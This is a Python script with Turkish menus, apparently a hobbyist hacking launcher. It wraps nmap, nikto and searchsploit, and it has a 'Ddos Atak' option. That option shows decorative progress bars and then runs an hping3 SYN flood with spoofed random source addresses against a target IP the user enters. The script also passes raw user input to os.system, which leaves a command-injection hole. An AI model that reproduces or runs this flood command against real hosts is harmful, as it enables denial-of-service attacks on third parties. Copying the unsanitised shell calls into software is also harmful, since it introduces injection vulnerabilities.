#!/usr/bin/env python

import os
import colorama
import time
from colorama import Fore, Back, Style


print(Back.RED)

asciibanner = Fore.RED + """

 #     #                          #######
 ##   ## #    # #      ##### #       #     ####   ####  #
 # # # # #    # #        #   #       #    #    # #    # #
 #  #  # #    # #        #   #       #    #    # #    # #
 #     # #    # #        #   #       #    #    # #    # #
 #     # #    # #        #   #       #    #    # #    # #
 #     #  ####  ######   #   #       #     ####   ####  ######


"""

print(Style.RESET_ALL)
toollist = Fore.LIGHTGREEN_EX + """
[1]Port Scanner               [2]Zaafiyet Tarama

[3]Exploit Arama              [4]Ddos Atak
"""
plus = asciibanner + "\n\n" + toollist

os.system("clear")

print(plus)


tools = ["1", "2", "3", "4"]

choices = ["Y", "N", "y", "n"]

portscanner = tools[0]
zaafiyettarama = tools[1]
exploitarama = tools[2]
ddosatack = tools[3]

while True:

    toolchose = input(Fore.WHITE + "Islem Numarasi Girin: ")
    if toolchose == "1":

        print(Fore.MAGENTA)
        hedefip = input("Hedef Ip Girin:")
        os.system("nmap " + hedefip)
        print(Style.RESET_ALL)
        tryportscanner = input(Fore.LIGHTGREEN_EX +
                               '\n\nProgram kapatilsin mi ? [Y/N] ')
        if tryportscanner == 'n':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'N':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'y':
            break
        if tryportscanner == 'Y':
            break

    elif (toolchose == "2"):
        print(Fore.GREEN)
        hedefip2 = input("Hedef Ip Girin: ")
        os.system("nikto -h " + hedefip2)
        print(Style.RESET_ALL)
        tryportscanner = input(Fore.LIGHTGREEN_EX +
                               '\n\nProgram kapatilsin mi ? [Y/N] ')
        if tryportscanner == 'n':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'N':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'y':
            break
        if tryportscanner == 'Y':
            break

    elif (toolchose == "3"):
        print(Fore.BLUE)
        anahtarkelime = input("Anahtar Kelime Girin: ")
        os.system("searchsloit " + anahtarkelime)
        print(Style.RESET_ALL)
        tryportscanner = input(Fore.LIGHTGREEN_EX +
                               '\n\nProgram kapatilsin mi ? [Y/N] ')
        if tryportscanner == 'n':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'N':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'y':
            break
        if tryportscanner == 'Y':
            break

    elif (toolchose == "4"):

        print(Fore.RED)
        hedefip3 = input("Hedef Ip Girin: ")
        print("[■□□□□□□□□□] 10%")
        time.sleep(0.3)
        print("[■■□□□□□□□□] 20%")
        time.sleep(0.3)
        print("[■■■□□□□□□□] 30%")
        time.sleep(0.3)
        print("[■■■■□□□□□□] 40%")
        time.sleep(0.3)
        print("[■■■■■□□□□□] 50%")
        time.sleep(0.3)
        print("[■■■■■■□□□□] 60%")
        time.sleep(0.3)
        print("[■■■■■■■□□□] 70%")
        time.sleep(0.3)
        print("[■■■■■■■■□□] 80%")
        time.sleep(0.3)
        print("[■■■■■■■■■□] 90%")
        time.sleep(0.3)
        print("[■■■■■■■■■■] 100%")
        time.sleep(0.3)
        print("Tool Test Ediliyor")
        time.sleep(1)
        print(Fore.GREEN)
        print("▓▒▒▒▒▒▒▒▒▒ 10%")
        time.sleep(2)
        print("▓▓▒▒▒▒▒▒▒▒ 20%")
        time.sleep(0.5)
        print("▓▓▓▒▒▒▒▒▒▒ 30%")
        time.sleep(0.6)
        print("▓▓▓▓▒▒▒▒▒▒ 40%")
        time.sleep(0.8)
        print("▓▓▓▓▓▒▒▒▒▒ 50%")
        time.sleep(0.2)
        print("▓▓▓▓▓▓▒▒▒▒ 60%")
        time.sleep(0.6)
        print("▓▓▓▓▓▓▓▒▒▒ 70%")
        time.sleep(0.5)
        print("▓▓▓▓▓▓▓▓▒▒ 80%")
        time.sleep(0.4)
        print("▓▓▓▓▓▓▓▓▓▒ 90%")
        time.sleep(0.8)
        print("▓▓▓▓▓▓▓▓▓▓ 100%")
        time.sleep(1)
        print("Tool Calisiyor :)")
        time.sleep(0.3)
        os.system(
            "hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source " + hedefip3)

        print(Style.RESET_ALL)
        tryportscanner = input(Fore.LIGHTGREEN_EX +
                               '\n\nProgram kapatilsin mi ? [Y/N] ')
        if tryportscanner == 'n':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'N':
            print(Fore.LIGHTBLUE_EX + '\nProgram Yeniden Basliyor')
            time.sleep(5)
            os.system("clear")
            print(plus)
        if tryportscanner == 'y':
            break
        if tryportscanner == 'Y':
            break

else:

    print(Fore.RED)
    print("Hatali Secim")
